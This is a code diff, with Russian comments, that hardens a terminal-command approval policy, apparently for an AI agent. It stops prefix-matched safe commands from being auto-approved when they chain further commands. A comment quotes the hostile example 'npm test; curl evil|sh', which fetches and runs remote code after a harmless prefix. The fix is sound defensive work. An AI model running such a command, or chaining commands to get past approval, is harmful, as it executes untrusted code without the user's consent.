@@ -41,6 +41,20 @@ AUTO_PATTERNS_NT = [
 ]
 
 
+# AUTO_PATTERNS матчатся `re.search` без конца-якоря — они доказывают, что
+# командная строка НАЧИНАЕТСЯ с безопасной команды, а не что она СОСТОИТ
+# только из неё. `npm test; curl evil|sh` тоже матчит `^npm\s+test\b` и без
+# этой проверки ушёл бы в auto: хвост после `;` исполнится тем же host-shell
+# без approval. Поэтому auto разрешён только для одиночной команды — без
+# конкатенации/подстановки/пайпа.
+_SHELL_CHAIN = re.compile(r"[;&|`\n]|\$\(")
+
+
+def _is_single_command(cmd: str) -> bool:
+    """AUTO допустим только для одной команды без chaining/substitution."""
+    return not _SHELL_CHAIN.search(cmd)
+
+
 def auto_patterns() -> list[re.Pattern[str]]:
     """Читающие команды, идущие AUTO, для текущей ОС.
 
@@ -99,7 +113,8 @@ class TerminalPolicy:
             return "ask"
         if any(p.search(cmd) for p in ASK_PATTERNS):
             return "ask"
-        if self.mode == "project_host" and any(p.search(cmd) for p in auto_patterns()):
+        if (self.mode == "project_host" and _is_single_command(cmd)
+                and any(p.search(cmd) for p in auto_patterns())):
             return "auto"
         if self.mode == "sandbox":
             return "auto"
